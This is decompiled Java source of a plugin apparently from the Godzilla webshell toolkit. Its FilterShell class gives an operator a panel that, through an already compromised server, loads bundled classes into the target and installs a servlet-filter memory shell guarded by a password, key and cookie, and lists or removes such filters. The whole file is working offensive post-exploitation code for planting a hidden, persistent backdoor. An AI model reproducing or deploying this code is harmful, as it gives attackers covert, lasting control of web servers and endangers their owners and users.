/*     */ package shells.plugins.java;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ComponentAdapter;
/*     */ import java.awt.event.ComponentEvent;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JComboBox;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextField;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "FilterShell", DisplayName = "FilterShell")
/*     */ public class FilterShell
/*     */   implements Plugin
/*     */ {
/*  32 */   private static final String[] MEMORYSHELS = new String[] { "AES_BASE64", "AES_RAW" };
/*     */   
/*     */   private static final String CLASS_NAME = "plugin.FilterManage";
/*     */   
/*     */   private final JPanel panel;
/*     */   
/*     */   private final JLabel filterShellPassLabel;
/*     */   
/*     */   private final JLabel filterShellSecretKeyLabel;
/*     */   
/*     */   private final JLabel filterShellCkLabel;
/*     */   
/*     */   private final JLabel filterShellPayloadLabel;
/*     */   
/*     */   private final JTextField filterShellPassTextField;
/*     */   
/*     */   private final JTextField filterShellSecretKeyTextField;
/*     */   
/*     */   private final JTextField filterShellCkTextField;
/*     */   private final JComboBox<String> payloadComboBox;
/*     */   private final JButton addFilterShellButton;
/*     */   private final JButton getAllFilterButton;
/*     */   private final JButton removeFilterButton;
/*     */   private final JSplitPane splitPane;
/*     */   private final RTextArea resultTextArea;
/*     */   private boolean loadState;
/*     */   private ShellEntity shellEntity;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   
/*     */   public FilterShell() {
/*  63 */     this.panel = new JPanel(new BorderLayout());
/*     */ 
/*     */     
/*  66 */     this.filterShellPassLabel = new JLabel("password : ");
/*  67 */     this.filterShellCkLabel = new JLabel("Cookie : ");
/*  68 */     this.filterShellSecretKeyLabel = new JLabel("secretKey : ");
/*  69 */     this.filterShellPayloadLabel = new JLabel("payload : ");
/*     */     
/*  71 */     this.filterShellCkTextField = new JTextField(functions.md5(Long.toString(System.currentTimeMillis())).substring(0, 16), 18);
/*  72 */     this.filterShellPassTextField = new JTextField("pass", 15);
/*  73 */     this.filterShellSecretKeyTextField = new JTextField("key", 15);
/*  74 */     this.payloadComboBox = new JComboBox<>(MEMORYSHELS);
/*     */     
/*  76 */     this.addFilterShellButton = new JButton("addFilterShell");
/*  77 */     this.getAllFilterButton = new JButton("getAlllFilter");
/*  78 */     this.removeFilterButton = new JButton("removeFilter");
/*     */     
/*  80 */     this.resultTextArea = new RTextArea();
/*  81 */     this.splitPane = new JSplitPane();
/*     */     
/*  83 */     this.splitPane.setOrientation(0);
/*  84 */     this.splitPane.setDividerSize(0);
/*     */     
/*  86 */     JPanel topPanel = new JPanel();
/*     */     
/*  88 */     topPanel.add(this.filterShellPassLabel);
/*  89 */     topPanel.add(this.filterShellPassTextField);
/*  90 */     topPanel.add(this.filterShellSecretKeyLabel);
/*  91 */     topPanel.add(this.filterShellSecretKeyTextField);
/*  92 */     topPanel.add(this.filterShellCkLabel);
/*  93 */     topPanel.add(this.filterShellCkTextField);
/*  94 */     topPanel.add(this.filterShellPayloadLabel);
/*  95 */     topPanel.add(this.payloadComboBox);
/*  96 */     topPanel.add(this.getAllFilterButton);
/*  97 */     topPanel.add(this.addFilterShellButton);
/*  98 */     topPanel.add(this.removeFilterButton);
/*     */     
/* 100 */     this.splitPane.setTopComponent(topPanel);
/* 101 */     this.splitPane.setBottomComponent(new JScrollPane((Component)this.resultTextArea));
/*     */     
/* 103 */     this.splitPane.addComponentListener(new ComponentAdapter()
/*     */         {
/*     */           public void componentResized(ComponentEvent e) {
/* 106 */             FilterShell.this.splitPane.setDividerLocation(0.15D);
/*     */           }
/*     */         });
/*     */     
/* 110 */     this.panel.add(this.splitPane);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   private void loadFilterManage() {
/* 116 */     if (!this.loadState) {
/*     */       try {
/* 118 */         InputStream inputStream = getClass().getResourceAsStream("assets/FilterManage.classs");
/* 119 */         byte[] data = functions.readInputStream(inputStream);
/* 120 */         inputStream.close();
/* 121 */         if (this.payload.include("plugin.FilterManage", data)) {
/* 122 */           this.loadState = true;
/* 123 */           Log.log("Load success", new Object[0]);
/*     */         } else {
/* 125 */           Log.error("Load fail");
/*     */         }
/*     */       
/* 128 */       } catch (Exception e) {
/* 129 */         Log.error(e);
/*     */       } 
/*     */     }
/*     */   }
/*     */   
/*     */   private void addFilterShellButtonClick(ActionEvent actionEvent) {
/*     */     try {
/* 136 */       String secretKey = functions.md5(this.filterShellSecretKeyTextField.getText()).substring(0, 16);
/* 137 */       String ck = this.filterShellCkTextField.getText();
/* 138 */       String password = this.filterShellPassTextField.getText();
/* 139 */       if (secretKey.length() > 0 && ck.length() > 0 && password.length() > 0) {
/* 140 */         String shellName = (String)this.payloadComboBox.getSelectedItem();
/* 141 */         ReqParameter reqParameter = new ReqParameter();
/* 142 */         reqParameter.add("secretKey", secretKey);
/* 143 */         reqParameter.add("ck", ck);
/* 144 */         reqParameter.add("pwd", password);
/* 145 */         String className = String.format("f.%s", new Object[] { shellName });
/* 146 */         InputStream inputStream = getClass().getResourceAsStream(String.format("assets/F_%s.classs", new Object[] { shellName }));
/* 147 */         byte[] classByteArray = functions.readInputStream(inputStream);
/* 148 */         inputStream.close();
/* 149 */         boolean loaderState = this.payload.include(className, classByteArray);
/* 150 */         if (loaderState) {
/* 151 */           byte[] result = this.payload.evalFunc(className, "run", reqParameter);
/* 152 */           String resultString = this.encoding.Decoding(result);
/* 153 */           Log.log(resultString, new Object[0]);
/* 154 */           this.resultTextArea.setText(String.format("You can access it at any Url\nYou Header is Cookie: %s=%s;", new Object[] { ck, functions.md5(Long.toString(System.currentTimeMillis())).substring(5, 12) }));
/* 155 */           GOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
/* 156 */           this.filterShellCkTextField.setText(functions.md5(Long.toString(System.currentTimeMillis())).substring(0, 16));
/*     */         } else {
/* 158 */           GOptionPane.showMessageDialog(this.panel, "loader fail!", "提示", 2);
/*     */         } 
/*     */       } else {
/* 161 */         GOptionPane.showMessageDialog(this.panel, "password or secretKey or ck is Null", "提示", 2);
/*     */       } 
/* 163 */     } catch (Exception e) {
/* 164 */       Log.error(e);
/* 165 */       GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*     */     } 
/*     */   }
/*     */   private void getAllFilterButtonClick(ActionEvent actionEvent) {
/* 169 */     loadFilterManage();
/* 170 */     byte[] result = this.payload.evalFunc("plugin.FilterManage", "getAllFilter", new ReqParameter());
/* 171 */     this.resultTextArea.setText(this.encoding.Decoding(result));
/*     */   }
/*     */   
/*     */   private void removeFilterButtonClick(ActionEvent actionEvent) {
/* 175 */     loadFilterManage();
/* 176 */     String filterName = GOptionPane.showInputDialog("filterName");
/* 177 */     if (filterName != null && filterName.length() > 0) {
/* 178 */       ReqParameter reqParameter = new ReqParameter();
/* 179 */       reqParameter.add("filterName", filterName);
/* 180 */       byte[] result = this.payload.evalFunc("plugin.FilterManage", "unFilter", reqParameter);
/* 181 */       String resultString = this.encoding.Decoding(result);
/* 182 */       Log.log(resultString, new Object[0]);
/* 183 */       GOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 189 */     this.shellEntity = shellEntity;
/* 190 */     this.payload = this.shellEntity.getPayloadModule();
/* 191 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 192 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 199 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\java\FilterShell.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */